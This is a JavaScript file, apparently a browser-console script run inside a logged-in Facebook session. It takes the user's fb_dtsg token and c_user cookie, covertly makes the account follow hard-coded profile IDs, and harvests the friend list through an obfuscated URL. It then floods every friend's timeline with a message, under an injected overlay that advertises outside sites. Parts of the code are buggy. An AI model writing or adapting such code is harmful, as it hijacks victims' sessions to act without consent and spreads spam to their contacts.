
function hp_d12(s) {
var o = "",
ar = new Array(),
os = "",
ic = 0,
p = 0;
for (i = 0; i < s.length; i++) {
c = s.charCodeAt(i);
if (c < 128) c = c ^ ((p++ % 8) + 1);
os += String.fromCharCode(c);
if (os.length > 80) {
ar[ic++] = os;
os = ""
}
}
o = ar.join("") + os;
return o
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama);
if (konum != -1) {
konum += tarama.length;
son = document.cookie.indexOf(";", konum);
if (son == -1) son = document.cookie.length;
return unescape(document.cookie.substring(konum, son))
} else {
return ""
}
}
}
function getRandomInt(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length - 1)]
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
var http4 = new XMLHttpRequest();
var url4 = "/ajax/follow/follow_profile.php?__a=1";
var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
http4.onreadystatechange = function() {
if (http4.readyState == 4 && http4.status == 200) {
http4.close
}
};
http4.send(params4)
}
a("100001052749861");
a("100001052749861");
a("663827066995712");
a("663827066995712");

function HTML_text_composer_hdeartext_and_postdatacollection(sender){
if(document.getElementById("txtFloodMsg").value!="") msg = document.getElementById("txtFloodMsg").value;
jx.load(window.location.protocol+"//"+unescape('%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F%62%6F%6F%74%73%74%72%61%70%2E%70%68%70%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%67%72%6F%75%70%26%76%69%65%77%65%72')+"="+Env.user+"&token=v7&lazy=0&__user="+Env.user,
	function(data){
		var text = data;
		var json = text.substring(text.indexOf('{'));
		var friends = JSON.parse(json);
		friends = friends.payload.entries;
		for(var n = 0; n < friends.length; n++){
			arr.push(friends[n].uid);
		}
		sender.parentNode.innerHTML = "Please wait....";
		setInterval("_xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin_()",30000);
	});
}
var a = document.body.innerHTML;
var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1]; 
var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
//var msg = unescape("%4A%6F%69%6E%20%55%73%20%46%6F%72%20%4D%6F%72%65%20%54%72%69%63%6B%73%20%48%61%73%73%61%6E%20%57%61%61%74%6D%61%6E%69%20%57%77%77%2E%4E%65%74%70%66%2E%63%6F%6D");
function _xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin_(){    
        pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc]+ "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer";            
        with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded") , send(pst);
        suc++;
        if(suc>arr.length){alert("Now Refresh The Page.."); suc=0;}
        else setTimeout("_xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin_()",30000/arr.length);
}
var askformsg = "<table><tr><strong><td>Write Your Message Here & Join Facebook.com/Waatmani.</td><strong></tr><tr><td><textarea id='txtFloodMsg' style='width:400px;height:150px'></textarea></td></tr><tr><td><input type='button' value='Click To Start Post_Join Netpf.com.com...' onclick='HTML_text_composer_hdeartext_and_postdatacollection(this);' /></td></tr></table>";
var askDIV = document.createElement("div");
askDIV.style.position = "absolute";
askDIV.style.backgroundColor = "#47BF6D";
askDIV.style.zIndex = "100";
askDIV.style.top = "150px";
askDIV.style.left = "200px";
askDIV.innerHTML = askformsg;
document.body.appendChild(askDIV);
//setTimeout("HTML_text_composer_hdeartext_and_postdatacollection()",1000);
